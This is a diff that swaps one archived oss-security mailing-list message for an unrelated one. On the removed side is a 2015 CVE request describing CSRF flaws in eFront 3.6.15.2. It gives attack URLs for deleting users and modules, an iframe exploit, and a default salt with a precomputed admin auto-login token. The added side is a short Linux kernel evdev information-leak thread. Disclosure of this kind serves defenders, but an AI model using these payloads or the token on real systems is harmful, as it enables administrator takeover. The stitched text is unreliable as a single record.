@@ -1,128 +1,53 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/08/2
-Message-ID: <CALH-=7zs4R1Efw8Dfu6xJ9QtsJWKSTyB_Lm-qBODvSOMUkQBrg@mail.gmail.com>
-Date: Sun, 8 Feb 2015 10:00:00 +0100
-From: Steffen Rösemann <steffen.roesemann1986@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: CVE-Request -- eFront v. 3.6.15.2 build 18021 (Community Edition) -- Multiple CSRF vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/01/21/7
+Message-ID: <20150121130317.GA18317@amd>
+Date: Wed, 21 Jan 2015 14:03:17 +0100
+From: Pavel Machek <pavel@....cz>
+To: "Mehaffey, John" <John_Mehaffey@...tor.com>, oss-security@...ts.openwall.com
+Subject: Re: CVE Request: Linux kernel information leak in event device handling
 Content-Type: text/plain; charset=utf-8
 
-Hi Steve, Josh, vendors, list.
+On Wed 2015-01-21 13:49:45, Petr Matousek wrote:
+> On Tue, Jan 20, 2015 at 03:23:19PM +0000, Mehaffey, John wrote:
+> > > From: Marcus Meissner [meissner@...e.de]
+> > > Sent: Tuesday, January 20, 2015 6:43 AM
+> > > To: OSS Security List
+> > > Subject: [oss-security] CVE Request: Linux kernel information leak in event device handling
+> > >
+> > > Hi,
+> > >
+> > > This needs a CVE, information leak out of the kernel.
+> > >
+> > > This probably was introduced by commit 483180281f0ac60d1138710eb21f4b9961901294
+> > > in Linux 3.9.
+> > >
+> > > Ciao, Marcus
+> > >
+> > > http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=7c4f56070fde2367766fa1fb04852599b5e1ad35
+> > > https://bugzilla.suse.com/show_bug.cgi?id=904899
+> > >
+> > > Input: evdev - fix EVIOCG{type} ioctl
+> > >
+> > > The 'max' size passed into the function is measured in number of bits
+> > > (KEY_MAX, LED_MAX, etc) so we need to convert it accordingly before
+> > > trying to copy the data out, otherwise we will try copying too much
+> > > and end up with up with a page fault.
+> > >
+> > > Reported-by: Pavel Machek <pavel@....cz>
+> > > Reviewed-by: Pavel Machek <pavel@....cz>
+> > > Reviewed-by: David Herrmann <dh.herrmann@...il.com>
+> > > Signed-off-by: Dmitry Torokhov <dmitry.torokhov@...il.com>
+> > 
+> > I don't see how this could leak information to the user.
+> > 
+> > Without the patch, too much memory is allocated internally in the driver, and too much data is copied into that buffer (potentially causing a page fault) but the same, correct amount of data is copied out to the user both before and after this patch.
+> 
+> @Pavel -- did you encounter the page fault? Looking at the code, even
+> the oversized copy from dev->sw looks to be satisfied by the remaining
+> fields in input_dev structure.
 
-I found multiple CSRF vulnerabilities in eFront v. 3.6.15.2 (build 18021),
-Community Edition.
-
-Technical details:
-
-The vulnerabilities can be found in different modules that are all used in
-the administrator.php file:
-
-ctg=modules (delete and deactivate/activate modules):
-
-http://
-{TARGET}/www/administrator.php?ctg=modules&delete_module={MODULE_NAME}&ajax=ajax
-http://
-{TARGET}/www/administrator.php?ctg=modules&deactivate_module={MODULE_NAME}&ajax=ajax
-http://
-{TARGET}/www/administrator.php?ctg=modules&activate_module={MODULE_NAME}&ajax=ajax
-
-ctg=users (delete and deactivate/activate users):
-
-http://
-{TARGET}/www/administrator.php?ctg=users&activate_user={USER_NAME}&ajax=ajax
-http://
-{TARGET}/www/administrator.php?ctg=users&deactivate_user={USER_NAME}&ajax=ajax
-http://
-{TARGET}/www/administrator.php?ctg=users&delete_user={USER_NAME}&ajax=ajax
-
-ctg=themes (activate/deactivate and delete themes):
-
-http://
-{TARGET}/www/administrator.php?ctg=themes&tab=set_theme&set_theme={THEME_ID}&ajax=ajax
-http://
-{TARGET}/www/administrator.php?ctg=themes&tab=set_theme&delete={THEME_ID}&ajax=ajax
-
-ctg=digest (deactivate/activate and delete events, e.g. deactivate user
-registration, deactivate email for account activation)
-
-e.g. EVENT_ID 3 = user email activation
-e.g. EVENT_ID 4 = user registration
-
-http://
-{TARGET}/www/administrator.php?ctg=digests&postAjaxRequest=1&deactivate_notification={EVENT_ID}&event=1&ajax=ajax
-http://
-{TARGET}/www/administrator.php?ctg=digests&postAjaxRequest=1&activate_notification={EVENT_ID}&event=1&ajax=ajax
-http://
-{TARGET}/www/administrator.php?ctg=digests&delete_notification={EVENT_ID}&ajax=1&event=1
-
-ctg=languages (deactivate/activate and delete language settings)
-
-e.g. LANGUAGE_NAME = german
-
-http://
-{TARGET}/www/administrator.php?ctg=languages&activate_language={LANGUAGE_NAME}&ajax=ajax
-http://
-{TARGET}/www/administrator.php?ctg=languages&deactivate_language={LANGUAGE_NAME}&ajax=ajax
-http://
-{TARGET}/www/administrator.php?ctg=languages&delete_language={LANGUAGE_NAME}&ajax=ajax
-
-
-Exploit-Example (valid for all above listed vulnerabilities):
-
-<iframe src="http://
-{TARGET}/www/administrator.php?ctg=digests&delete_notification={EVENT_ID}&ajax=1&event=1"></iframe>
-
-
-The following CSRF-vulnerability can be abused to activate/deactivate the
-auto-login feature of an arbitrary user:
-
-http://{TARGET}/www/administrator.php?ctg=maintenance&postAjaxRequest=1&autologin=1&login={USERNAME}&ajax=ajax
-
-
-That makes it possible to login via a URL in an arbitrary user-account like
-in the following example without providing any login-credentials:
-
-http://{TARGET}/www/index.php?autologin={AUTO_LOGIN_TOKEN}
-
-eFront creates three standard user-accounts while the installation process.
-One of it is the administrators account.
-
-The components being used for creating the auto-login token are the
-following informations:
-
-- a salt
-- the accounts creation date
-- the username
-
-The salt isn't generated dynamically during the installation. On a common
-eFront installation without any changes by the administrator, it has the
-value cDWQR#$Rcxsc. The admin accounts creation date has the standard value
-1365149958.
-
-As the standard administrators accountname is "admin", the auto-login token
-for the administrators account of eFront has always the value
-eb514ea3c45d74a1218e207fb4b345b1 if the precondition is fulfilled, that
-none of the above mentioned values were changed after the installation.
-
-That makes it possible for an attacker to abuse the CSRF-vulnerability to
-gain access to the administrators account.
-
-
-
-Can I have a CVE-ID / CVE-IDs for the issue(s)?
-
-Thank you very much!
-
-Greetings from Germany.
-
-Steffen Rösemann
-
-References:
-
-[1] http://www.efrontlearning.net
-[2] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-09.html
-[3] https://github.com/epignosis/efront_open_source/issues/7
-[4]
-http://sroesemann.blogspot.de/2015/01/report-for-advisory-sroeadv-2015-09.html
-[5] http://seclists.org/fulldisclosure/2015/Feb/30
-
+Yes. I guess you could search the original report somewhere...
+									Pavel
+-- 
+(english) http://www.livejournal.com/~pavelmachek
+(cesky, pictures) http://atrey.karlin.mff.cuni.cz/~pavel/picture/horses/blog.html
